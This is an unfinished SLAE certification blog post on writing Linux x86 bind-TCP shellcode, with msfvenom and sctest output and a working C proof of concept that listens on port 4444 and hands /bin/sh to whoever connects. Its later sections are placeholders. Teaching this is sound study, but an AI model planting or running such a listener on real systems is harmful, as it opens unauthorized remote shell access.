<!DOCTYPE HTML>
<!--
	Solution for SLAE question #1

-->
<html>
	<head>
		<link rel="icon" href="../images/favicon.ico">
		<title>The Post</title>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
		<link rel="stylesheet" href="../assets/css/main.css" />
		<link rel="stylesheet" href="../assets/css/atom-one-dark-reasonable.min.css">
		<script src="../assets/js/highlight.pack.js"></script>
		<script>hljs.initHighlightingOnLoad();</script>
		<noscript><link rel="stylesheet" href="../assets/css/noscript.css" /></noscript>
	</head>
	<body class="is-preload">

		<!-- Wrapper -->
			<div id="wrapper">

				<!-- Header -->
					<header id="header">
						<a class="logo">The Defense</a>
					</header>

				<!-- Nav -->
					<nav id="nav">
						<ul class="links">
							<li><a href="../index.html">Home</a></li>
							<li class="active"><a href="../posts.html">Posts</a></li>
							<li><a href="../research.html">Research</a></li>
							<li><a href="../stories.html">Stories</a></li>
							<li><a href="../references.html">Links</a></li>
						</ul>
						<ul class="icons">
							<li><a href="mailto:jpc0016@uah.edu" class="icon fa-paper-plane-o" target="_blank"><span class="label">Gmail</span></a></li>
							<li><a href="https://github.com/jpc0016" class="icon fa-github" target="_blank"><span class="label">GitHub</span></a></li>
							<li><a href="https://twitter.com/JohnGuy_01" class="icon fa-twitter" target="_blank"><span class="label">Twitter</span></a></li>
							<li><a href="https://stackoverflow.com/users/11770689/jpc0016?tab=profile" class="icon fa-stack-overflow" target="_blank"><span class="label">StackOverflow</span></a></li>
						</ul>
					</nav>

				<!-- Main -->
					<div id="main">
						<div class="wrapper">

						<!-- Post -->

                  <section class="post">
                    <body>
                      <article id="first-post">
												<a href="index.html"><img src="../images/chirs.png" class="avatar" alt="avatar"> </img></a>
                        <h2>&emsp; Creating Shell_Bind_TCP Shellcode </h2>
												<h5>&emsp; &emsp; &emsp; &emsp; September 18, 2020</h5>
                        <div class="box">
                          <p>
														&emsp; &emsp;This post involves writing shellcode to create a <i>Bind TCP</i> shell on a victim machine. &nbsp;This is also known as
														<i>port-binding shellcode</i>. &nbsp;Before continuing high-level analysis, it is worth noting the difference between
														bind and reverse TCP shells:<br><br>
														A bind shell is a command line interface opened when an attacker machine opens a port on the victim machine and connects to it. &nbsp;
														The victim machine listens to incoming connections and the attacker machine makes the connection. &nbsp;This is typically done
														using IP address 0.0.0.0 to denote listening on all interfaces. &nbsp;A diagram of a bind TCP shell is shown below.
											 	</p>
												<center><div class="image post"><img src="../images/slae/bind-shell.png" alt="" /></div></center><br>
												<br>

												<p>
													Reverse shells are functionally similar to bind shells but work in the opposite direction. &nbsp;Instead, the attacker machine listens
													for incoming connections from the vicitim machine over a preconfigured port (such as 4444). &nbsp;The connection attempt is initiated by the victim
													machine, usually by invoking a reverse shell. &nbsp;Below is what a reverse TCP shell looks like.
												</p>
												<center><div class="image post"><img src="../images/slae/reverse-shell.png" alt="" /></div></center><br>


												<br><h2>Drafting the Proof of Concept</h2>

												<p>
													&emsp; &emsp;It is important to visualize what a bind shell looks like in higher level objective C code before attempting to write it in x86 assembly. &nbsp;
													<a href="https://www.wiley.com/en-us/The+Shellcoder%27s+Handbook%3A+Discovering+and+Exploiting+Security+Holes%2C+2nd+Edition-p-9780470080238" target="_blank" style="color:blue;"><i>The Shellcoder's Handbook</i></a>
													formalizes this process in 5 steps:<br><br>
													&emsp; &emsp;1) &nbsp;Write desired shellcode in a high-level language.<br>
													&emsp; &emsp;2) &nbsp;Compile and disassemble the high-level shellcode program.<br>
													&emsp; &emsp;3) &nbsp;Analyze how the program works from an assembly level.<br>
													&emsp; &emsp;4) &nbsp;Clean up the assembly to make it smaller and injectable.<br>
													&emsp; &emsp;5) &nbsp;Extract opcodes and create shellcode.<br><br>
													 &nbsp;The tool, <i>libemu</i> has a component
													called <i>sctest</i> (shellcode test) that analyzes payloads to reveal useful information. &nbsp;Using it with <i>msfvenom</i> shows the main functions used in an unstaged bind shell payload.
													 &nbsp;Below is the output of the command <code>msfvenom -p linux/x86/shell_bind_tcp R | ~/SLAE/Libemu/tools/sctest/sctest -vvv -Ss 100000</code>
												</p>

												<pre>
													<code class="bash" style=display:block;white-space:pre-wrap>
-- snip --

int socket (
     int domain = 2;
     int type = 1;
     int protocol = 0;
) =  14;
int bind (
     int sockfd = 14;
     struct sockaddr_in * my_addr = 0x00416fc2 =>
         struct   = {
             short sin_family = 2;
             unsigned short sin_port = 23569 (port=4444);
             struct in_addr sin_addr = {
                 unsigned long s_addr = 0 (host=0.0.0.0);
             };
             char sin_zero = "       ";
         };
     int addrlen = 16;
) =  0;
int listen (
     int s = 14;
     int backlog = 0;
) =  0;
int accept (
     int sockfd = 14;
     sockaddr_in * addr = 0x00000000 =>
         none;
     int addrlen = 0x00000010 =>
         none;
) =  19;
int dup2 (
     int oldfd = 19;
     int newfd = 14;
) =  14;

 -- snip --

int dup2 (
     int oldfd = 19;
     int newfd = 0;
) =  0;
int execve (
     const char * dateiname = 0x00416fb2 =>
           = "/bin//sh";
     const char * argv[] = [
           = 0x00416faa =>
               = 0x00416fb2 =>
                   = "/bin//sh";
           = 0x00000000 =>
             none;
     ];
     const char * envp[] = 0x00000000 =>
         none;
) =  0;
													</code>
												</pre>


												<p>
													From here you can see the functions <i>socket()</i>, <i>bind()</i>, <i>listen()</i>, <i>accept()</i>, <i>dup2()</i>, and <i>execve()</i> are primary drivers of the
													payload. &nbsp;Conveniently it also displays parameters used along with their values. &nbsp;It takes some googling and reading Linux man-pages
													(like <a href="https://man7.org/linux/man-pages/man2/bind.2.html" target="_blank" style="color:blue;">this one</a>) to
													get a general idea of what libraries to include, where to find them, and what parameters each function needs. &nbsp;Below is the resultant PoC:
												</p>


												<pre>
													<code class="c-like" style=display:block;white-space:pre-wrap>
#include &lt;stdio.h>
#include &lt;netinet/in.h>
#include &lt;sys/types.h>
#include &lt;sys/socket.h>
#include &lt;unistd.h>

int main(){

  int fd, new_fd; // File descriptor to hold socket() output and accept() output respectively
  fd = socket(AF_INET, SOCK_STREAM, 0);

  // Define structures for home and remote machines
  struct sockaddr_in home, remote;

  // Set attributes in sockaddr_in home
  home.sin_family = AF_INET;
  home.sin_port = 4444;
  home.sin_addr.s_addr = 0;
  memset(&(home.sin_zero), '\0', 8);

  // Bind socket to home address structure
  bind(fd, (struct socketaddr *)&home, 16);

  // Listen on socket for a max length of 4 pending connections
  listen(fd, 4);

  // Create new file descriptor with contents of accepted connection structure
  new_fd = accept(fd, (struct sockaddr *)&remote, sizeof(struct sockaddr_in));

  // Duplicate socket file descriptor to each standard I/O file descriptor: stdin,
  // stdout, and stderr
  dup2(new_fd, 2);
  dup2(new_fd, 1);
  dup2(new_fd, 0);

  // Execute shell
  execve("//bin/sh", (char*[]){"//bin/sh", NULL});

}
													</code>
												</pre>

												<p>
													The above code looks very similar to what is found in server-side socket code. &nbsp;Rensselaer Polytechnic Institute (RPI) even provides a
													<a href="https://www.cs.rpi.edu/~moorthy/Courses/os98/Pgms/socket.html" target="_blank" style="color:blue;">walkthrough</a> of what each line of code means in their <i>server.c</i> program.
													 &nbsp; A quick explanation of each function is below:<br><br>
													 <b><i>socket</i></b>: &nbsp;Creates a TCP communication endpoint using an IPv4 address and defines it as a file descriptor (fd)<br>
													 <b><i>bind</i></b>: &nbsp;Assigns the file descriptor from <i>socket</i> to an address expressed as a structure. &nbsp;The address structure must be declared and have
													 its attributes prior to its use in <i>bind</i>. &nbsp;Attribute information can be found <a href="https://www.tutorialspoint.com/unix_sockets/socket_structures.htm" target="_blank" style="color:blue;">here</a>.<br>
													 <b><i>listen</i></b>: &nbsp;Marks the file descriptor from <i>socket</i> as passive and accepting of incoming connections.<br>
													 <b><i>accept</i></b>: &nbsp;Creates a new file descriptor using the first connection request in the listening socket/file descriptor.<br>
													 <b><i>dup2</i></b>: &nbsp;Duplicates the new file descriptor to the standard I/O file descriptors (stdin = 0, stdout = 1, stderr = 2). &nbsp;This allows normal text output to the new file descriptor for
													  when the shell is executed.<br>
													 <b><i>execve</i></b>: &nbsp;Execute <i>/bin/sh</i>. &nbsp;Make sure the string length is a multiple of 4 to cleanly push the instruction onto the stack. &nbsp;Command is <i>//bin/sh</i> in this case to make it
													 <i>//bi</i> and <i>n/sh</i>.<br><br>

													 This code can be tested by executing a quick compile and run. &nbsp;Open a new terminal window and run <i>netcat</i> against the pre-determined IP address and port number. &nbsp;The <i>-n</i> and
													 <i>-v</i> switches respectively prevent DNS lookups and enable verbose output. &nbsp;On success, a "succeeded!" message should display followed by a <i>/bin/sh</i> interface. &nbsp;Confirm the connection
													 with <i>netstat</i>.
												</p>
												<center><div class="image post"><img src="../images/slae/3-c-test.png" alt="" /></div></center><br>


												<br><h2>Assembly Code Creation</h2>

												<p>
													&emsp; &emsp;Now that high-level functions are organized, the fun starts when disassembling the binary to inspect activity. &nbsp;Running the binary through <i>objdump</i>
													shows the first function call in action. &nbsp;Each argument to <i>socket()</i> is pushed onto the stack before calling the function.
												</p>
												<center><div class="image post"><img src="../images/slae/4-socket-call.png" alt="" /></div></center><br>
												<!--The first step is to find the system call table that lists each primary function. -->


												<p>
													Although similar, it is not quite intended for the shellcode. &nbsp;It provides a clue to how assembly code will be drafted. &nbsp;Using function like <i>socket</i> in shellcode
													are better suited as system calls. &nbsp;To get system call information, the system call location must be known. &nbsp;This can happen with a neat command below, which shows
													header files used in preprocessing.
												</p>
												<center><div class="image post"><img src="../images/slae/5-find-file.png" alt="" /></div></center><br>


												<p>
													Open <i>asm/unistd_32.h</i> to find the expected system call table. &nbsp;Scroll down to find <i>socketcall</i> set to 102, <i>bind</i> to 361, <i>listen</i> to 363, and <i>accept4</i> to 364. &nbsp;Also
													<i>dup2</i> is 63 and <i>execve</i> is 11. &nbsp;Below is what the system call table looks like.
												</p>
												<center><div class="image post"><img src="../images/slae/6-syscalls.png" alt="" /></div></center><br>


												<p>
													The assembly can be created. &nbsp;Start with the jump-call-pop outline
												</p>





												<br><h2>Demonstration</h2>

												<p>
													Demonstrate shellcode here in test case
												</p>


												<br><h2>Final Thoughts</h2>

												<p>
													Conclusion and stuff
										 		</p>

                         <p>The source code for this assignment as well as other SLAE assignments is here:
												 <a href="https://github.com/jpc0016/SLAE-code" target="_blank" style="color:blue;">https://github.com/jpc0016/SLAE-code</a>
											 		</p>





												 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert (SLAE) certification:
												 <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank" style="color:blue;">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a><br><br>
												 Student ID: SLAE-XXXXX<br><br>

                        </div>

                      </article>
                    </body>
                  </section>








									<!--
									End post body
									-->

									<!--
									NEW POSTS GO ABOVE THIS LINE
									-->






									<!-- Remove Pagination
							<div class="pagination"><a href="#"> 1 </a></div>
							<div class="pagination"><a href="#"> 2 </a></div>
							<div class="pagination"><a href="#"> 3 </a></div>
							<div class="pagination"><a href="#"> 4 </a></div>
							<div class="pagination"><a href="#"> 5 </a></div>-->
							</div>
					</div>

				<!-- Footer -->
					<footer id="footer">

						<section class="split contact">

							<section>
								<h3>Social</h3>
								<ul class="icons alt">
									<li><a href="mailto:jpc0016@uah.edu" class="icon fa-paper-plane-o" target="_blank"><span class="label">Gmail</span></a></li>
									<li><a href="https://github.com/jpc0016" class="icon fa-github" target="_blank"><span class="label">GitHub</span></a></li>
									<li><a href="https://twitter.com/JohnGuy_01" class="icon fa-twitter" target="_blank"><span class="label">Twitter</span></a></li>
									<li><a href="https://stackoverflow.com/users/11770689/jpc0016?tab=profile" class="icon fa-stack-overflow" target="_blank"><span class="label">StackOverflow</span></a></li>
								</ul>
							</section>
						</section>
					</footer>

				<!-- Copyright -->
					<div id="copyright">
						<ul><li>&copy; Untitled</li><li>Design: <a href="https://html5up.net" target="_blank">HTML5 UP</a></li></ul>
					</div>

			</div>

		<!-- Scripts -->
			<script src="assets/js/jquery.min.js"></script>
			<script src="assets/js/jquery.scrollex.min.js"></script>
			<script src="assets/js/jquery.scrolly.min.js"></script>
			<script src="assets/js/browser.min.js"></script>
			<script src="assets/js/breakpoints.min.js"></script>
			<script src="assets/js/util.js"></script>
			<script src="assets/js/main.js"></script>

	</body>
</html>
